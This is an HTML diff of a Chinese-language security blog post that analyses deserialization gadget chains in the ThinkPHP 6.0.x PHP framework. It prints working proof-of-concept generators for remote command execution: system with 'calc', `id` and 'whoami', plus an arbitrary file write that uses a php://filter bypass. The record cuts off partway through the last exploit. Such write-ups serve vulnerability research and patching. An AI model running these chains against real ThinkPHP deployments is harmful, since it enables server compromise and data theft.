@@ -1,249 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-    <meta name="author" content="p0l1st">
-
-
-
-    <meta name="description" content="blog">
-
-
-
-<title>ThinkPHP6.0.X反序列化利用链 | p0l1st&#39;s blog</title>
-
-
-
-    <link rel="icon" href="/b.png">
-
-
-
-
-    <!-- stylesheets list from _config.yml -->
     
-    <link rel="stylesheet" href="/css/style.css">
+    <title>
+        ThinkPHP6.0.X反序列化利用链 |
+        
+        p0l1st&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update   app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&gt;lazySave可控，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP6.0.X反序列化利用链">
+<meta property="og:url" content="http://example.com/2024/07/10/ThinkPHP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="p0l1st&#39;s blog">
+<meta property="og:description" content="漏洞环境首先下载tp6.0.3 composer create-project topthink&#x2F;think&#x3D;6.0.3 tp603  然后更新版本 composer update   app&#x2F;controller&#x2F;Index.php设置反序列化可控点  漏洞分析利用链1全局搜索_destruct,定位到src\Model.php   $this-&gt;lazySave可控，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825951.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825284.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825133.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825834.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825297.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825318.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825038.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825027.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825068.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825230.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221826696.png">
+<meta property="og:image" content="http://example.com/images/image-20240710104447027.png">
+<meta property="og:image" content="http://example.com/images/image-20240710105329488.png">
+<meta property="og:image" content="http://example.com/images/image-20240710105426998.png">
+<meta property="og:image" content="http://example.com/images/image-20240710105649242.png">
+<meta property="og:image" content="http://example.com/images/image-20240710110533476.png">
+<meta property="og:image" content="http://example.com/images/image-20240710111255038.png">
+<meta property="og:image" content="http://example.com/images/image-20240710112522232.png">
+<meta property="og:image" content="http://example.com/images/image-20240710113246417.png">
+<meta property="og:image" content="http://example.com/images/image-20240710114039168.png">
+<meta property="og:image" content="http://example.com/images/image-20240710114832276.png">
+<meta property="og:image" content="http://example.com/images/image-20240710115743276.png">
+<meta property="og:image" content="http://example.com/images/image-20240710115904861.png">
+<meta property="og:image" content="http://example.com/images/image-20240710121445539.png">
+<meta property="og:image" content="http://example.com/images/image-20240710122144858.png">
+<meta property="og:image" content="http://example.com/images/image-20240710122338092.png">
+<meta property="og:image" content="http://example.com/images/image-20240710122453451.png">
+<meta property="og:image" content="http://example.com/images/image-20240710123707632.png">
+<meta property="og:image" content="http://example.com/images/image-20240710140857921.png">
+<meta property="og:image" content="http://example.com/images/image-20240710142424159.png">
+<meta property="og:image" content="http://example.com/images/image-20240710142552073.png">
+<meta property="og:image" content="http://example.com/images/image-20240710143805789.png">
+<meta property="og:image" content="http://example.com/images/image-20240710143722191.png">
+<meta property="og:image" content="http://example.com/images/image-20240710144420032.png">
+<meta property="article:published_time" content="2024-07-10T01:49:16.000Z">
+<meta property="article:modified_time" content="2024-08-22T10:28:20.969Z">
+<meta property="article:author" content="p0l1st">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png">
     
-
-
-
-    <!-- scripts list from _config.yml -->
-    
-    <script src="/js/script.js"></script>
-    
-    <script src="/js/tocbot.min.js"></script>
-    
-
-
-
     
     
         
+            <link rel="stylesheet" href="http://example.com/css/markdown.css">
+        
+            <link rel="stylesheet" href="http://example.com/css/july.css">
+        
     
-
-
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
 </head>
-
 <body>
-    <script>
-        // this function is used to check current theme before page loaded.
-        (() => {
-            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
-            const isDark = currentTheme === 'dark';
-            const pagebody = document.getElementsByTagName('body')[0]
-            if (isDark) {
-                pagebody.classList.add('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
-            } else {
-                pagebody.classList.remove('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Light"
-            }
-        })();
-    </script>
 
-    <div class="wrapper">
-        <header>
-    <nav class="navbar">
-        <div class="container">
-            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
-            <div class="menu navbar-right">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                    <a class="menu-item" href="/links">Links</a>
-                
-                <input id="switch_default" type="checkbox" class="switch_default">
-                <label for="switch_default" class="toggleBtn"></label>
-            </div>
-        </div>
-    </nav>
+<div id="banner-outer" class="hidden">
+    <div id="banner-image" style="background-image: url()"></div>
+    <img src="https://www.gravatar.com/avatar/7a585313ed855e8d652cbb3154a6056e?s=300&amp;d=mm&amp;r=g" id="avatar">
+</div>
 
-    
-    <nav class="navbar-mobile" id="nav-mobile">
-        <div class="container">
-            <div class="navbar-header">
-                <div>
-                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
-                </div>
-                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
-            </div>
-            <div class="menu" id="mobile-menu">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                    <a class="menu-item" href="/links">Links</a>
-                
-            </div>
-        </div>
-    </nav>
-
-</header>
-<script>
-    var mobileBtn = function f() {
-        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
-        var mobileMenu = document.getElementById("mobile-menu");
-        if(toggleMenu.classList.contains("active")){
-           toggleMenu.classList.remove("active")
-            mobileMenu.classList.remove("active")
-        }else{
-            toggleMenu.classList.add("active")
-            mobileMenu.classList.add("active")
-        }
-    }
-</script>
-            <div class="main">
-                <div class="container">
-    
-    
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
+<div id="menu-outer">
+    <div id="menu-inner">
+        
+            <a class="false" href="http://example.com/index.html">Home</a>
+        
+            <a class="false" href="http://example.com/archives/index.html">Archives</a>
+        
+            <a class="false" href="http://example.com/about/index.html">About</a>
+        
     </div>
 </div>
 
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
-
-    
-    <article class="post-wrap">
-        <header class="post-header">
-            <h1 class="post-title">ThinkPHP6.0.X反序列化利用链</h1>
-            
-                <div class="post-meta">
-                    
-                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
-                    
-
-                    
-                        <span class="post-time">
-                        Date: <a href="#">July 10, 2024&nbsp;&nbsp;9:49:16</a>
-                        </span>
-                    
-                    
-                </div>
-            
-        </header>
-
-        <div class="post-content">
-            <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先下载tp6.0.3</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.3 tp603</span><br></pre></td></tr></table></figure>
-
+<div id="content-outer" class="container">
+    <div id="content-inner">
+        <article id="post">
+    <h1 id="post-title">ThinkPHP6.0.X反序列化利用链</h1>
+    <time id="post-date" datetime="2024-07-10T01:49:16.000Z">
+        July 10, 2024
+    </time>
+    <div id="post-content" class="markdown-body">
+        <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先下载tp6.0.3</p>
+<pre><code>composer create-project topthink/think=6.0.3 tp603
+</code></pre>
 <p>然后更新版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/../images/image-20240710095443189.png" alt="image-20240710095443189"></p>
+<pre><code>composer update
+</code></pre>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png" alt="image-20240710095443189"></p>
 <p>app&#x2F;controller&#x2F;Index.php设置反序列化可控点</p>
-<p><img src="/../images/image-20240710095655616.png" alt="image-20240710095655616"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png" alt="image-20240710095655616"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h2><p>全局搜索_destruct,定位到src\Model.php</p>
-<p><img src="/../images/image-20240710100016061.png" alt="image-20240710100016061"></p>
-<p><img src="/../images/image-20240710100037629.png" alt="image-20240710100037629"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825951.png" alt="image-20240710100016061"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825284.png" alt="image-20240710100037629"></p>
 <p>$this-&gt;lazySave可控，直接跟进save方法</p>
-<p><img src="/../images/image-20240710100556355.png" alt="image-20240710100556355"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825133.png" alt="image-20240710100556355"></p>
 <p>继续跟进updateData方法，发现其调用了检查字段的checkAllowFields方法，跟进</p>
-<p><img src="/../images/image-20240710100832177.png" alt="image-20240710100832177"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825834.png" alt="image-20240710100832177"></p>
 <p>checkAllowFields方法又调用了db方法，继续跟进</p>
-<p><img src="/../images/image-20240710101033350.png" alt="image-20240710101033350"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825297.png" alt="image-20240710101033350"></p>
 <p>这里的$this-&gt;table和$this-&gt;suffix都是可控的，可以利用字符串拼接来触发toString方法</p>
-<p><img src="/../images/image-20240710101254556.png" alt="image-20240710101254556"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825318.png" alt="image-20240710101254556"></p>
 <p>我们再来全局搜索toString方法，跟进\src\model\concern\Conversion.php中的toJson方法</p>
-<p><img src="/../images/image-20240710103400986.png" alt="image-20240710103400986"></p>
-<p><img src="/../images/image-20240710103512162.png" alt="image-20240710103512162"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825038.png" alt="image-20240710103400986"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825027.png" alt="image-20240710103512162"></p>
 <p>其调用了toArray方法，跟进</p>
-<p><img src="/../images/image-20240710103844186.png" alt="image-20240710103844186"></p>
-<p>继续跟进getAttr方法，发现在try中调用了getData方法</p>
-<p><img src="/../images/image-20240710104115113.png" alt="image-20240710104115113"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825068.png" alt="image-20240710103844186">继续跟进getAttr方法，发现在try中调用了getData方法</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825230.png" alt="image-20240710104115113"></p>
 <p>跟进getData方法，其又调用了getRealFieldName方法</p>
-<p><img src="/../images/image-20240710104226388.png" alt="image-20240710104226388"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221826696.png" alt="image-20240710104226388"></p>
 <p>跟进getRealFieldName，当$this-&gt;strict为true时会返回$name</p>
 <p><img src="/../images/image-20240710104447027.png" alt="image-20240710104447027"></p>
 <p>回到getData方法，$fieldName得到$name返回值后会进入由array_key_exists()进行判断然后返回$this-&gt;data&#x3D;[$fieldName]</p>
@@ -252,8 +131,45 @@
 <p><img src="/../images/image-20240710105426998.png" alt="image-20240710105426998"></p>
 <p>跟进getValue方法，发现有$value   &#x3D; $closure($value, $this-&gt;data)，这里的$closure、$value和$this-&gt;data都是可控的，那么就可以使得$closure作为函数名、$value和$this-&gt;data作为参数实现任意函数执行</p>
 <p><img src="/../images/image-20240710105649242.png" alt="image-20240710105649242"></p>
-<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;p0l1st&quot;</span> =&gt; <span class="string">&quot;calc&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$visible</span> = [<span class="string">&quot;p0l1st&quot;</span> =&gt; <span class="string">&quot;1&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;p0l1st&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$obj</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?php
+namespace think;
+abstract class Model&#123;
+    use model\concern\Attribute;
+    use model\concern\ModelEvent;
+    protected $table;
+    private $force;
+    private $exists;
+    private $lazySave;
+    private $data = [];
+    function __construct($obj)&#123;
+        $this-&gt;table = $obj;
+        $this-&gt;force = true;
+        $this-&gt;exists = true;
+        $this-&gt;lazySave = true;
+        $this-&gt;data = [&quot;p0l1st&quot; =&gt; &quot;calc&quot;];
+    &#125;
+&#125;
 
+namespace think\model\concern;
+trait ModelEvent&#123;
+    protected $withEvent = true;
+    protected $visible = [&quot;p0l1st&quot; =&gt; &quot;1&quot;];
+&#125;
+trait Attribute&#123;
+    private $withAttr = [&quot;p0l1st&quot; =&gt; &quot;system&quot;];
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model&#123;
+    function __construct($obj = &#39;&#39;)&#123;
+        parent::__construct($obj);
+    &#125;
+&#125;
+
+echo urlencode(serialize(new Pivot(new Pivot())));
+?&gt;
+</code></pre>
 <p><img src="/../images/image-20240710110533476.png" alt="image-20240710110533476"></p>
 <h2 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h2><p>继续全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php</p>
 <p><img src="/../images/image-20240710111255038.png" alt="image-20240710111255038"></p>
@@ -274,10 +190,46 @@
 <p>再看$data,$data来源于$value，而$value来源于$contents，$contents来源于getForStorage，需要经过json_encode方法处理，所以需要使json_encode后的数据被当作代码执行</p>
 <p>Linux中可以用这样的形式</p>
 <p><img src="/../images/image-20240710121445539.png" alt="image-20240710121445539"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractCache</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">autosave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$complete</span> = <span class="string">&quot;`id`&quot;</span>;</span><br><span class="line">        <span class="comment">// protected $complete = &quot;\&quot;&amp;whoami&amp;&quot; ;</span></span><br><span class="line">        <span class="comment">// 在Windows环境中反引号无效，用&amp;替代</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">AbstractCache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$key</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>=<span class="string">&quot;&quot;</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Driver</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [&quot;<span class="title class_">serialize</span>&quot;=&gt;[&quot;<span class="title class_">system</span>&quot;],&quot;<span class="title class_">expire</span>&quot;=&gt;1,&quot;<span class="title class_">prefix</span>&quot;=&gt;&quot;1&quot;,&quot;<span class="title class_">hash_type</span>&quot;=&gt;&quot;<span class="title class_">sha256</span>&quot;,&quot;<span class="title class_">cache_subdir</span>&quot;=&gt;&quot;1&quot;,&quot;<span class="title class_">path</span>&quot;=&gt;&quot;1&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$cache</span> = <span class="keyword">new</span> think\filesystem\<span class="title function_ invoke__">CacheStore</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cache</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php 
 
+namespace League\Flysystem\Cached\Storage &#123;
+    abstract class AbstractCache &#123;
+        protected $autosave = false;
+        protected $complete = &quot;`id`&quot;;
+        // protected $complete = &quot;\&quot;&amp;whoami&amp;&quot; ;
+        // 在Windows环境中反引号无效，用&amp;替代
+    &#125;
+&#125;
 
+namespace think\filesystem &#123;
+    use League\Flysystem\Cached\Storage\AbstractCache;
+    class CacheStore extends AbstractCache &#123;
+        protected $key = &quot;1&quot;;
+        protected $store;
+        public function __construct($store=&quot;&quot;) &#123;
+            $this-&gt;store = $store;
+        &#125;
+    &#125;
+&#125;
 
+namespace think\cache &#123;
+    abstract class Driver &#123;
+        protected $options = [&quot;serialize&quot;=&gt;[&quot;system&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;&quot;1&quot;,&quot;hash_type&quot;=&gt;&quot;sha256&quot;,&quot;cache_subdir&quot;=&gt;&quot;1&quot;,&quot;path&quot;=&gt;&quot;1&quot;];
+    &#125;
+&#125;
+
+namespace think\cache\driver &#123;
+    use think\cache\Driver;
+    class File extends Driver&#123;&#125;
+&#125;
+
+namespace &#123;
+    $file = new think\cache\driver\File();
+    $cache = new think\filesystem\CacheStore($file);
+    echo base64_encode(serialize($cache));
+&#125;
+?&gt;
+</code></pre>
 <h3 id="PoC2"><a href="#PoC2" class="headerlink" title="PoC2"></a>PoC2</h3><p>继续跟进src&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php中的set方法，该方法后面还调用了file_put_contents方法</p>
 <p><img src="/../images/image-20240710122144858.png" alt="image-20240710122144858"></p>
 <p>先跟进$filename，发现其又调用了getCacheKey方法</p>
@@ -286,8 +238,44 @@
 <p><img src="/../images/image-20240710122453451.png" alt="image-20240710122453451"></p>
 <p>再看$data，其来源于$this-&gt;serialize($value)，但是后面拼接时有exit()，可以使用php:&#x2F;&#x2F;filter绕过</p>
 <p>那么至此就存在任意文件写入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractCache</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">autosave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$complete</span> = <span class="string">&quot;uuuPD9waHAgcGhwaW5mbygpOw==&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span> &#123;</span><br><span class="line">    <span class="title 